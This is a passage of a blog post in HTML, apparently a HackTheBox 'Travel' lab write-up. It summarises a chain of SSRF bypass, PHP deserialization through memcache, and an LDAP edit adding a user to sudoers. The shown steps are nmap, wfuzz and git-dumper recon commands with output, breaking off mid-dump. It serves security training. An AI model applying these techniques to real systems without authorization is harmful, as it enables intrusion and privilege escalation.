@@ -1,0 +1,1775 @@
+<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <script type="text/javascript" src="/scripts/lightbox/lightbox.js"></script><link rel="stylesheet" href="/scripts/lightbox/lightbox.css"> <script src="https://cdn.onesignal.com/sdks/OneSignalSDK.js" async=""></script> <script> var OneSignal = window.OneSignal || []; OneSignal.push(function() { OneSignal.init({ appId: "7174cacd-26ac-4796-aa89-4928af4847f1", }); }); </script><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><meta name="description" content="Dumping the .git dir and bypassing the ssrf along with chaining it with the php-deserialization and php-memcache to get a rce then doing some ldapmodify to modify some users entries to get the shell as root........" /><meta property="og:title" content="Hackthebox Travel writeup" /><meta property="og:description" content="Dumping the .git dir and bypassing the ssrf along with chaining it with the php-deserialization and php-memcache to get a rce then doing some ldapmodify to modify some users entries to get the shell as root........" /><meta property="og:image" content="https://0xprashant.github.io/hackthebox/travel/travel.png"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:site" content="@0xprashant"><meta property="twitter:title" content="Hackthebox Travel writeup"><meta name="twitter:creator" content="@0xprashant"><meta name="twitter:description" content="Dumping the .git dir and bypassing the ssrf along with chaining it with the php-deserialization and php-memcache to get a rce then doing some ldapmodify to modify some users entries to get the shell as root........"><meta name="twitter:image" content="https://0xprashant.github.io/hackthebox/travel/travel.png"><title>Hackthebox Travel writeup | 0xPrashant</title><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/post.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/sample/avatar.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">0xPrashant</a></div><div class="site-subtitle font-italic">InfoSec/Cybersec Blog And Writeups</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <a href="https://www.hackthebox.eu/home/users/profile/84820" target="_blank"></i> <i class="fas fa-cube"></i> </a> <a href="https://github.com/0xprashant" target="_blank"> <i class="fab fa-github"></i> </a> <a href="https://discordapp.com/users/476931503981592607" target="_blank"> <i class="fab fa-discord"></i> </a> <a href="https://twitter.com/0xprashant" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href="https://linkedin.com/in/prashant-saini-8a7a1a162" target="_blank"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Hackthebox Travel writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hackthebox Travel writeup</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Thu, May 21, 2020, 12:00 AM +0800" > May 21 <i class="unloaded">2020-05-21T00:00:00+08:00</i> </span> by <span class="author"> Prashant Saini </span></div></div><div class="post-content"> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/travel/travel.png" class="post-preview-img"><h1 id="introductiontravel">Introduction@Travel:~$</h1><div class="table-wrapper"><table><thead><tr><th>Column<th>Details<tbody><tr><td>Name<td>Travel<tr><td>IP<td>10.10.10.189<tr><td>Points<td>40<tr><td>Os<td>Linux<tr><td>Difficulty<td>Hard<tr><td>Creator<td><a href="https://www.hackthebox.eu/home/users/profile/13569" target="_blank">XCT</a> And <a href="https://www.hackthebox.eu/home/users/profile/77141" target="_blank">JKR</a><tr><td>Out On<td>16 May 2020</table></div><h1 id="brieftravel">Brief@Travel:~$</h1><p>This Box is the best box i have ever done in my life <strong>tbh</strong> and in my <code class="language-plaintext highlighter-rouge">opinion</code> it should be in <strong>Insane</strong> category. The Journey of this machine starts with two of the <code class="language-plaintext highlighter-rouge">subdomains</code> revealed by <strong>Nmap</strong>. Fuzzing the <code class="language-plaintext highlighter-rouge">blog-dev.travel.htb</code> I came across the .git dir which is <code class="language-plaintext highlighter-rouge">Forbidden</code> as obvious but we can dump it with <code class="language-plaintext highlighter-rouge">git-dumper</code>. And Got some <code class="language-plaintext highlighter-rouge">php</code> files understanding the code we came to a conclusion that we have the code for <code class="language-plaintext highlighter-rouge">awesome_rss</code>.Bypassing the <strong>ssrf</strong> and chaining in with the <code class="language-plaintext highlighter-rouge">php-deserialization</code> and <strong>php-memchache</strong> we will get a shell as <code class="language-plaintext highlighter-rouge">www-data</code>.Got username and <code class="language-plaintext highlighter-rouge">password</code> from a <strong>.sql</strong> file and logged in as <code class="language-plaintext highlighter-rouge">lynik-admin</code>.The user <code class="language-plaintext highlighter-rouge">lynik-admin</code> is the admin of the <code class="language-plaintext highlighter-rouge">LDAP</code>.We can modify the enteries for users available and added any of the user to the <code class="language-plaintext highlighter-rouge">sudoers</code> group so we will be able to run command as root.</p><h1 id="summary">Summary</h1><ul><li><code class="language-plaintext highlighter-rouge">Nmap</code> shows the <strong>subdomain</strong> <code class="language-plaintext highlighter-rouge">blog-dev.travel.htb</code><li><strong>Fuzzing</strong> the Subdomain got <strong>.git</strong> and its files<li>Using <code class="language-plaintext highlighter-rouge">git-dumper</code> to get the whole <code class="language-plaintext highlighter-rouge">repo</code><li>Ananlyzing the <strong>php - code</strong><li>Concluded that <code class="language-plaintext highlighter-rouge">rss_template.php is</code> awesome_rss.<li>Got a parameter <code class="language-plaintext highlighter-rouge">?custom_feed_url=</code><li>Getting response on our <strong>listener</strong><li>Trying for <code class="language-plaintext highlighter-rouge">ssrf</code> and bypassing it .<li>Discovering the output from the <code class="language-plaintext highlighter-rouge">debug.php</code><li>Ananlyzing the <strong>memcache</strong> and the key.<li>Triggering the <code class="language-plaintext highlighter-rouge">php - deserialization</code><li>Building the exploit by chaining these <code class="language-plaintext highlighter-rouge">vulnerabilities</code><li>Got shell as <code class="language-plaintext highlighter-rouge">www-data</code><li>Found some <strong>database</strong> information from the file <code class="language-plaintext highlighter-rouge">wp-config.php</code><li>Dumping data from the <strong>database</strong> and it is a rabbit hole.<li>Got the <code class="language-plaintext highlighter-rouge">backup</code> <strong>.sql</strong> file<li>Got username and password from the file<li>Logged in as <code class="language-plaintext highlighter-rouge">lynik-admin</code><li>Getting <strong>user.txt</strong><li>Found two files <code class="language-plaintext highlighter-rouge">.ldaprc</code> and <code class="language-plaintext highlighter-rouge">.viminfo</code>.<li>Got password for <strong>LDAP</strong> from vim file<li>Ruuning <code class="language-plaintext highlighter-rouge">query</code> in the <strong>ldap</strong><li>Modifying the entry for the user <code class="language-plaintext highlighter-rouge">jane</code> to add it in <code class="language-plaintext highlighter-rouge">sudoers</code> <strong>group</strong><li>Got shell as <code class="language-plaintext highlighter-rouge">jane</code><li>Ruuning commands as <code class="language-plaintext highlighter-rouge">root</code> using <strong>sudo</strong><li>Getting root.txt</ul><h1 id="pwned">Pwned</h1><html><head><link rel="stylesheet" type="text/css" href="/asciinema-player.css" /><body> <asciinema-player src="/hackthebox/travel/5470d0a6-18e5-4781-8dcc-104102772ecf/travel.cast" start-at="0" autoplay="1.5" speed="2.0" loop="1" cols="150" rows="20"></asciinema-player> <script src="/asciinema-player.js"></script><h1 id="recon">Recon</h1><h2 id="nmap">Nmap</h2><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+</pre><td class="rouge-code"><pre>➜  travel nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p-</span> <span class="nt">-v</span> <span class="nt">-oA</span> scans/nmap-full <span class="nt">-T4</span> travel.htb 
+<span class="c"># Nmap 7.70 scan initiated Sun May 17 07:15:56 2020 as: nmap -sC -sV -p- -v -oA scans/nmap-full -T4 travel.htb</span>
+Nmap scan report <span class="k">for </span>travel.htb <span class="o">(</span>10.10.10.189<span class="o">)</span>
+Host is up <span class="o">(</span>0.32s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 65532 closed ports
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+80/tcp  open  http     nginx 1.17.6
+| http-methods: 
+|_  Supported Methods: GET HEAD
+|_http-server-header: nginx/1.17.6
+|_http-title: Travel.HTB
+443/tcp open  ssl/http nginx 1.17.6
+| http-methods: 
+|_  Supported Methods: GET HEAD
+|_http-server-header: nginx/1.17.6
+|_http-title: Travel.HTB - SSL coming soon.
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>www.travel.htb/organizationName<span class="o">=</span>Travel.HTB/countryName<span class="o">=</span>UK
+| Subject Alternative Name: DNS:www.travel.htb, DNS:blog.travel.htb, DNS:blog-dev.travel.htb
+| Issuer: <span class="nv">commonName</span><span class="o">=</span>www.travel.htb/organizationName<span class="o">=</span>Travel.HTB/countryName<span class="o">=</span>UK
+| Public Key <span class="nb">type</span>: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2020-04-23T19:24:29
+| Not valid after:  2030-04-21T19:24:29
+| MD5:   ef0a a4c1 fbad 1ac4 d160 58e3 beac 9698
+|_SHA-1: 0170 7c30 db3e 2a93 cda7 7bbe 8a8b 7777 5bcd 0498
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+<span class="c"># Nmap done at Sun May 17 07:31:49 2020 -- 1 IP address (1 host up) scanned in 953.71 seconds</span>
+</pre></table></code></div></div><p>So basically Three ports are opened <code class="language-plaintext highlighter-rouge">22:ssh</code> <code class="language-plaintext highlighter-rouge">80:http</code> and <code class="language-plaintext highlighter-rouge">443:https</code> and if we look <strong>ssl-cert</strong> We can see clearly that there are two <code class="language-plaintext highlighter-rouge">subdomains</code></p><ul><li><strong>blog.travel.htb</strong><li><strong>blog-dev.travel.htb</strong></ul><p>Added these two to the <code class="language-plaintext highlighter-rouge">hosts</code> file.</p><h2 id="port-80">Port-80</h2><p>There is a timer running on the <code class="language-plaintext highlighter-rouge">webpage</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/travel/5470d0a6-18e5-4781-8dcc-104102772ecf/image-1.png" alt="Port-80" /></p><h3 id="wfuzz">Wfuzz</h3><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+</pre><td class="rouge-code"><pre>➜  travel git:<span class="o">(</span>master<span class="o">)</span> ✗ wfuzz <span class="nt">-u</span> http://travel.htb/FUZZ <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">--hc</span> 404 <span class="nt">--hh</span> 5093
+
+Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzzs documentation <span class="k">for </span>more information.
+
+<span class="k">********************************************************</span>
+<span class="k">*</span> Wfuzz 2.3.4 - The Web Fuzzer                         <span class="k">*</span>
+<span class="k">********************************************************</span>
+
+Target: http://travel.htb/FUZZ
+Total requests: 220560
+
+<span class="o">==================================================================</span>
+ID   Response   Lines      Word         Chars          Payload    
+<span class="o">==================================================================</span>
+
+000039:  <span class="nv">C</span><span class="o">=</span>301      7 L       11 W          170 Ch        <span class="s2">"img"</span>
+000550:  <span class="nv">C</span><span class="o">=</span>301      7 L       11 W          170 Ch        <span class="s2">"css"</span>
+000721:  <span class="nv">C</span><span class="o">=</span>301      7 L       11 W          170 Ch        <span class="s2">"lib"</span>
+000953:  <span class="nv">C</span><span class="o">=</span>301      7 L       11 W          170 Ch        <span class="s2">"js"</span>
+002963:  <span class="nv">C</span><span class="o">=</span>301      7 L       11 W          170 Ch        <span class="s2">"newsfeed"</span>
+</pre></table></code></div></div><p>Dont get Pretty <code class="language-plaintext highlighter-rouge">good</code> stuff from the <strong>Fuzzing</strong> this dir , only the dir <code class="language-plaintext highlighter-rouge">newsfeed</code> seems to be <strong>suspicious</strong>.</p><h2 id="port-443-https">Port 443 (HTTPS)</h2><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/travel/5470d0a6-18e5-4781-8dcc-104102772ecf/image-2.png" alt="Port-443" /></p><p>Its better if we dont use the <code class="language-plaintext highlighter-rouge">https</code> Protocol XD</p><h1 id="blogtravelhtb">Blog.travel.htb</h1><p>Since i have added the entry for the subdomain in the <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file so i can access it simply.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/travel/5470d0a6-18e5-4781-8dcc-104102772ecf/image-3.png" alt="Blog.travel.htb" /></p><h2 id="fuzzing">Fuzzing</h2><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+</pre><td class="rouge-code"><pre>➜  travel git:<span class="o">(</span>master<span class="o">)</span> ✗ wfuzz <span class="nt">-u</span> http://blog.travel.htb/FUZZ <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">--hc</span> 404 <span class="nt">--hh</span> 24462     
+                                                         
+Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzzs documentation <span class="k">for </span>more informati
+on.                                                                                                                           
+<span class="k">********************************************************</span>                                                                                              
+<span class="k">*</span> Wfuzz 2.3.4 - The Web Fuzzer                         <span class="k">*</span>                                                                                              
+<span class="k">********************************************************</span>                                                                                              
+
+Target: http://blog.travel.htb/FUZZ
+Total requests: 220560
+
+<span class="o">==================================================================</span>
+ID   Response   Lines      Word         Chars          Payload    
+<span class="o">==================================================================</span>
+
+000037:  <span class="nv">C</span><span class="o">=</span>301      0 L        0 W            0 Ch        <span class="s2">"rss"</span>
+000053:  <span class="nv">C</span><span class="o">=</span>302      0 L        0 W            0 Ch        <span class="s2">"login"</span>
+000124:  <span class="nv">C</span><span class="o">=</span>301      0 L        0 W            0 Ch        <span class="s2">"0"</span>
+000126:  <span class="nv">C</span><span class="o">=</span>301      0 L        0 W            0 Ch        <span class="s2">"feed"</span>
+000169:  <span class="nv">C</span><span class="o">=</span>301      0 L        0 W            0 Ch        <span class="s2">"atom"</span>
+000198:  <span class="nv">C</span><span class="o">=</span>301      0 L        0 W            0 Ch        <span class="s2">"a"</span>
+000241:  <span class="nv">C</span><span class="o">=</span>301      9 L       28 W          323 Ch        <span class="s2">"wp-content"</span>
+000259:  <span class="nv">C</span><span class="o">=</span>302      0 L        0 W            0 Ch        <span class="s2">"admin"</span>
+000459:  <span class="nv">C</span><span class="o">=</span>301      0 L        0 W            0 Ch        <span class="s2">"h"</span>
+000551:  <span class="nv">C</span><span class="o">=</span>301      0 L        0 W            0 Ch        <span class="s2">"rss2"</span>
+000786:  <span class="nv">C</span><span class="o">=</span>301      9 L       28 W          324 Ch        <span class="s2">"wp-includes"</span>
+000901:  <span class="nv">C</span><span class="o">=</span>301      0 L        0 W            0 Ch        <span class="s2">"A"</span>
+001312:  <span class="nv">C</span><span class="o">=</span>301      0 L        0 W            0 Ch        <span class="s2">"H"</span>
+001604:  <span class="nv">C</span><span class="o">=</span>301      0 L        0 W            0 Ch        <span class="s2">"rdf"</span>
+001632:  <span class="nv">C</span><span class="o">=</span>301      0 L        0 W            0 Ch        <span class="s2">"page1"</span>
+002024:  <span class="nv">C</span><span class="o">=</span>301      0 L        0 W            0 Ch        <span class="s2">"'"</span>
+002587:  <span class="nv">C</span><span class="o">=</span>301      0 L        0 W            0 Ch        <span class="s2">"aw"</span>
+002927:  <span class="nv">C</span><span class="o">=</span>302      0 L        0 W            0 Ch        <span class="s2">"dashboard"</span>
+003305:  <span class="nv">C</span><span class="o">=</span>301      0 L        0 W            0 Ch        <span class="s2">"he"</span>
+003790:  <span class="nv">C</span><span class="o">=</span>301      0 L        0 W            0 Ch        <span class="s2">"%20"</span>
+005630:  <span class="nv">C</span><span class="o">=</span>301      0 L        0 W            0 Ch        <span class="s2">"hello"</span>
+006627:  <span class="nv">C</span><span class="o">=</span>301      0 L        0 W            0 Ch        <span class="s2">"2020"</span>
+007180:  <span class="nv">C</span><span class="o">=</span>301      9 L       28 W          321 Ch        <span class="s2">"wp-admin"</span>
+007685:  <span class="nv">C</span><span class="o">=</span>301      0 L        0 W            0 Ch        <span class="s2">"awesome"</span>
+011090:  <span class="nv">C</span><span class="o">=</span>301      0 L        0 W            0 Ch        <span class="s2">"0000"</span>
+013934:  <span class="nv">C</span><span class="o">=</span>301      0 L        0 W            0 Ch        <span class="s2">"hello-world"</span>
+</pre></table></code></div></div><p>So many <code class="language-plaintext highlighter-rouge">dirs</code> or files are out there Some <code class="language-plaintext highlighter-rouge">interesting</code> ones are these</p><blockquote><p>awesome (Redirect to <code class="language-plaintext highlighter-rouge">awesome-rss</code>)</p></blockquote><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/travel/5470d0a6-18e5-4781-8dcc-104102772ecf/image-4.png" alt="Awesome-rss" /></p><p>This seems to be some <code class="language-plaintext highlighter-rouge">posts</code> details that are shown using a template.Lets see it later on</p><blockquote><h1 id="blog-devtravelhtb">blog-dev.travel.htb</h1></blockquote><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/travel/5470d0a6-18e5-4781-8dcc-104102772ecf/image-5.png" alt="Blog-dev.travel.htb" /></p><p>The content of the initial dir is <code class="language-plaintext highlighter-rouge">forbidden</code> for us</p><h2 id="fuzzing-got-the-git-dir">Fuzzing (Got the .git dir)</h2><p>I tried many <code class="language-plaintext highlighter-rouge">wordlists</code> on the subdomain but i was literally expecting something from here and i ended up finding some juicy stuff from wordlists <code class="language-plaintext highlighter-rouge">fuzz-Bo0oM.txt</code> from <strong>SecLists</strong></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+</pre><td class="rouge-code"><pre>➜  Fuzzing wfuzz <span class="nt">-u</span> http://blog-dev.travel.htb/FUZZ <span class="nt">-w</span> /usr/share/wordlists/SecLists/Fuzzing/fuzz-Bo0oM.txt <span class="nt">--hc</span> 404 <span class="nt">--hh</span> 154,157
+
+Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzzs documentation <span class="k">for </span>more information.
+
+<span class="k">********************************************************</span>
+<span class="k">*</span> Wfuzz 2.3.4 - The Web Fuzzer                         <span class="k">*</span>
+<span class="k">********************************************************</span>
+
+Target: http://blog-dev.travel.htb/FUZZ
+Total requests: 4288
+
+<span class="o">==================================================================</span>
+ID   Response   Lines      Word         Chars          Payload    
+<span class="o">==================================================================</span>
+
+000167:  <span class="nv">C</span><span class="o">=</span>301      7 L       11 W          170 Ch        <span class="s2">".git"</span>
+000171:  <span class="nv">C</span><span class="o">=</span>200      5 L       13 W           92 Ch        <span class="s2">".git/config"</span>
+000172:  <span class="nv">C</span><span class="o">=</span>200      1 L        2 W           23 Ch        <span class="s2">".git/HEAD"</span>
+000173:  <span class="nv">C</span><span class="o">=</span>200      4 L       13 W          292 Ch        <span class="s2">".git/index"</span>
+000175:  <span class="nv">C</span><span class="o">=</span>200      1 L       11 W          153 Ch        <span class="s2">".git/logs/HEAD"</span>
+000176:  <span class="nv">C</span><span class="o">=</span>301      7 L       11 W          170 Ch        <span class="s2">".git/logs/refs"</span>
+
+Total <span class="nb">time</span>: 147.8096
+Processed Requests: 4288
+Filtered Requests: 4282
+Requests/sec.: 29.01027
+</pre></table></code></div></div><p>If you can see that there is a <code class="language-plaintext highlighter-rouge">directory</code> <strong>.git</strong> but only some of its files are <strong>public</strong></p><p>But we can <strong>dump</strong> the whole <code class="language-plaintext highlighter-rouge">repo</code> , Yes…Yes we can do it.</p><p>There is a tool called <code class="language-plaintext highlighter-rouge">git-dumper</code> we can use it to dump the whole <code class="language-plaintext highlighter-rouge">repo</code></p><blockquote><p><a href="https://github.com/arthaud/git-dumper" target="_blank">https://github.com/arthaud/git-dumper</a></p></blockquote><p>I cloned this tool <code class="language-plaintext highlighter-rouge">repo</code> to my machine and its time to run it .</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+</pre><td class="rouge-code"><pre>➜  git-dumper git:<span class="o">(</span>master<span class="o">)</span> ./git-dumper.py <span class="nt">--help</span>
+usage: git-dumper.py <span class="o">[</span>options] URL DIR
+
+Dump a git repository from a website.
+
+positional arguments:
+  URL                   url
+  DIR                   output directory
+
+optional arguments:
+  <span class="nt">-h</span>, <span class="nt">--help</span>            show this <span class="nb">help </span>message and <span class="nb">exit</span>
+  <span class="nt">--proxy</span> PROXY         use the specified proxy
+  <span class="nt">-j</span> JOBS, <span class="nt">--jobs</span> JOBS  number of simultaneous requests
+  <span class="nt">-r</span> RETRY, <span class="nt">--retry</span> RETRY
+                        number of request attempts before giving up
+  <span class="nt">-t</span> TIMEOUT, <span class="nt">--timeout</span> TIMEOUT
+                        maximum <span class="nb">time </span><span class="k">in </span>seconds before giving up
+</pre></table></code></div></div><p>We need some thing to specify as <code class="language-plaintext highlighter-rouge">args</code> that is <code class="language-plaintext highlighter-rouge">URL</code> to the git repo we want to dump.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+</pre><td class="rouge-code"><pre>➜  git-dumper git:<span class="o">(</span>master<span class="o">)</span> ./git-dumper.py http://blog-dev.travel.htb/ blog-dev                                                               <span class="o">[</span>21/404]
+<span class="o">[</span>-] Testing http://blog-dev.travel.htb/.git/HEAD <span class="o">[</span>200]                                                                                                
+<span class="o">[</span>-] Testing http://blog-dev.travel.htb/.git/ <span class="o">[</span>403]                                                                                                    
+<span class="o">[</span>-] Fetching common files                                                                                                                             
+<span class="o">[</span>-] Fetching http://blog-dev.travel.htb/.gitignore <span class="o">[</span>404]                                                                                              
+<span class="o">[</span>-] Fetching http://blog-dev.travel.htb/.git/COMMIT_EDITMSG <span class="o">[</span>200]                                                                                     
+<span class="o">[</span>-] Fetching http://blog-dev.travel.htb/.git/hooks/commit-msg.sample <span class="o">[</span>200]                                                                            
+<span class="o">[</span>-] Fetching http://blog-dev.travel.htb/.git/hooks/applypatch-msg.sample <span class="o">[</span>200]                                                                        
+<span class="o">[</span>-] Fetching http://blog-dev.travel.htb/.git/description <span class="o">[</span>200]                                                                                        
+<span class="o">[</span>-] Fetching http://blog-dev.travel.htb/.git/hooks/post-commit.sample <span class="o">[</span>404]                                                                           
+<span class="o">[</span>-] Fetching http://blog-dev.travel.htb/.git/hooks/post-update.sample <span class="o">[</span>200]                                                                           
+<span class="o">[</span>-] Fetching http://blog-dev.travel.htb/.git/hooks/pre-applypatch.sample <span class="o">[</span>200]                                                                        
+<span class="o">[</span>-] Fetching http://blog-dev.travel.htb/.git/hooks/post-receive.sample <span class="o">[</span>404]                                                                          
+<span class="o">[</span>-] Fetching http://blog-dev.travel.htb/.git/hooks/pre-commit.sample <span class="o">[</span>200]                                                                            
+<span class="o">[</span>-] Fetching http://blog-dev.travel.htb/.git/hooks/pre-rebase.sample <span class="o">[</span>200]                                                                            
